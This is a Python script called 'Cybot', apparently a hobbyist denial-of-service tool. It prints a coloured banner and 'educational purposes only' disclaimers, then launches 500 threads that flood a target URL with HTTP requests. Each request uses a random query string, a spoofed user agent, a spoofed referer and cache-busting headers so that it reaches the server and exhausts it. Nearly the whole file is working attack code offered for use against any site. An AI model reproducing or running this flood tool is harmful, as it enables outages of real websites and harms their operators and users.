import colorama
import time
from colorama import Fore,Back,Style,init
init(autoreset=True)


print (Fore.RED + 'It is a testing program so be use it carefully.') 
time.sleep(2)
print (Fore.RED + 'Any illegal use of this program we are not responsible.')
time.sleep(5)
print (Back.BLACK + Fore.RED + Style.BRIGHT +         "   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''   "  )
time.sleep(1)
print (Back.BLACK + Fore.MAGENTA + Style.BRIGHT +     "   '     |'''''| |====\  +++++++  [=======]  \    /    |'''''|     '   "  )
time.sleep(1)
print (Back.BLACK + Fore.WHITE + Style.BRIGHT +       "   '     |_____| |     |    |         !       \  /     |_____|     '   "  )
time.sleep(1)
print (Back.BLACK + Fore.CYAN + Style.BRIGHT +        "   '     |     | |     |    |         !        \/      |     |     '   "  )
time.sleep(1)
print (Back.BLACK + Fore.BLUE + Style.BRIGHT +        "   '     |     | |====/  +++++++      !        ||      |     |     '   "  )
time.sleep(1)
print (Back.BLACK + Fore.LIGHTRED_EX + Style.BRIGHT + "   ',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'   "  )
print(" ")
time.sleep(4)
print (Fore.LIGHTYELLOW_EX + Back.LIGHTBLACK_EX +'It is a DDos attacking tool so be carefull')
time.sleep(3)
print(" ")
print (Fore.LIGHTYELLOW_EX + Back.LIGHTBLACK_EX +'This tool is a dos tool to put heavy loads on the server so if the server recieves too many request the server will stop .')
time.sleep(3)
print(" ")
print (Fore.LIGHTYELLOW_EX + Back.LIGHTBLACK_EX +'use this tool for educational purpose only')
time.sleep(6)
print(" ")

print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.GREEN     +       "   ======= \         / ||>>>>>>  |======| [========]  ")
time.sleep(1)
print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.CYAN      +       "  //         \     /   ||     >  |      |     ||      ")
time.sleep(1)
print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "  ||           \ /     ||------  |      |     ||      ")
time.sleep(1)
print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLUE      +       "  \\            |      ||     >  |      |     ||      ")
time.sleep(1)
print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.MAGENTA   +       "   =======      |      ||>>>>>>  |======|     ||      ")
print(" ")
print(" ")
time.sleep(3)
print(Fore.BLACK + Back.LIGHTYELLOW_EX +" made by ADITYA PAWAR ")
print(" ")
print(" ")
time.sleep(2)
print(Fore.BLACK + Back.LIGHTYELLOW_EX +" contact me on blahblahblah I am just joking ")
print(" ")



#print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Tell me your name => ")
#name = input()
#time.sleep(2)
#print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + " so Hello , " + name)
#time.sleep(2)
#print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "you want to ddos attack on an website . tell me yes or no ")
#boolean = input()
#time.sleep(2)

#if ( boolean == "yes" ):
#  print(Fore.LIGHTYELLOW_EX + Style.BRIGHT +" Ok ! you can use this tool but for only education purpose only ")
 #   time.sleep(1)
#    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT +"If you don't have any permisson then kill process")
#elif( boolean == "no"):
#    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT +"ok you an leave now")
#    time.sleep(1)
#    exit()
#else:
#    print(Fore.RED + Style.BRIGHT +"error !")
#    exit()






import urllib2
import sys
import time
import socket
import threading
import random
import re

#global parameters
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
  print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "   ======= \         / ||>>>>>>  |======| [========]  ")
  print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "  //         \     /   ||     >  |      |     ||      ")
  print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "  ||           \ /     ||------  |      |     ||      ")
  print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "  \\            |      ||     >  |      |     ||      ")
  print(Style.BRIGHT + Back.LIGHTWHITE_EX + Fore.BLACK     +       "   =======      |      ||>>>>>>  |======|     ||      ")
  print (Fore.MAGENTA + Style.BRIGHT + '---------------------------------------------------')
  print (Fore.MAGENTA + Style.BRIGHT + 'USAGE: python Cybot.py <url>')
  print (Fore.MAGENTA + Style.BRIGHT + 'you can add "safe" after url, to autoshut after dos')
  print (Fore.MAGENTA + Style.BRIGHT + '---------------------------------------------------')

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'Response Code 500'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print (Fore.BLACK + Back.YELLOW +"\n-- CYBOT Attack Finished --")

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print (Fore.BLACK + Back.YELLOW +"-- CYBOT Attack Started --")
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
